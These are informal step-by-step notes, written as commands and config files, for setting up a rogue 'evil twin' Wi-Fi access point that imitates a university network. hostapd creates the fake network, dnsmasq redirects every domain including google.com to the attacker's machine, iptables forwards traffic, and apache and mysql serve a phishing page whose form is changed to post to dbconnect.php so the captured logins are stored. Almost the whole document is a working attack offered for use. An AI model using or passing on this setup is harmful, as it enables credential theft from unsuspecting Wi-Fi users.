first do airmon-ng check kill
and then do these
sudo hostapd hostapd2.conf 

-hostapd2.conf contents:
interface=wlan0
driver=nl80211
ssid=_University
channel=6

then do :

ifconfig wlan0 up 10.0.0.1 netmask 255.255.255.0

route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1


sudo dnsmasq -C dnsmasq2.conf -d

-dnsmasq2.conf contents:
interface=wlan0

domain-needed
no-poll
bogus-priv

address=/#/10.0.0.1

address=/www.google.com/10.0.0.1 #works


then type these

sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE    --> eth0 here is whatever adapter is connected to legitimate wifi
sudo iptables --append FORWARD --in-interface wlan0 -j ACCEPT  --> wlan0 is whatever wireless card you have plugged in

then type 
sudo echo 1 > /proc/sys/net/ipv4/ip_forward


make sure to copy the apache 000-default.conf from above website and do the rewrite thing. then
sudo service apache2 start
sudo service mysql start

if you want to change the phishing site, just choose any phishing site, change the action to action=dbconnect.php. thats it





# if your eth0 has an ip octet of 192.168.1.1/24 , then you have to put the dnsmasq2.conf with 10.0.0.1, and vice versa.
# if it doesnt work, unplug your wireless card and try again. if still doesnt work, do airmon-ng check kill, then put it into monitor mode and then put it back to normal mode.


also if you want airodump-ng to work, just unplug and plug again
